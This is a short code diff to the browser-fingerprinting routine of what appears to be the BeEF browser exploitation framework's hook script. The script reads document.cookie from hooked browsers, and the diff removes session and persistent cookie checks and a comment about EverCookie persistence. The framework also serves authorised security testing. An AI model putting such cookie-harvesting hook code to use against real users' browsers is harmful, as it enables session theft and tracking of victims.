@@ -2680,18 +2680,12 @@ beef.browser = {
         var has_wmp = (beef.browser.hasWMP()) ? "Yes" : "No";
         try {
             var cookies = document.cookie;
-            var veglol = beef.browser.cookie.veganLol();
-            var has_session_cookies = (beef.browser.cookie.hasSessionCookies(veglol)) ? "Yes" : "No";
-            var has_persistent_cookies = (beef.browser.cookie.hasPersistentCookies(veglol)) ? "Yes" : "No";
+            /* Never stop the madness dear C.
+             * var veglol = beef.browser.cookie.veganLol();
+             */
             if (cookies) details['Cookies'] = cookies;
-            if (has_session_cookies) details['hasSessionCookies'] = has_session_cookies;
-            if (has_persistent_cookies) details['hasPersistentCookies'] = has_persistent_cookies;
         } catch (e) {
-            // the hooked origin is using HttpOnly. EverCookie is persisting the BeEF hook in a different way,
-            // and there is no reason to read cookies at this point
             details['Cookies'] = "Cookies can't be read. The hooked origin is most probably using HttpOnly.";
-            details['hasSessionCookies'] = "No";
-            details['hasPersistentCookies'] = "No";
         }
 
         if (browser_name) details['BrowserName'] = browser_name;
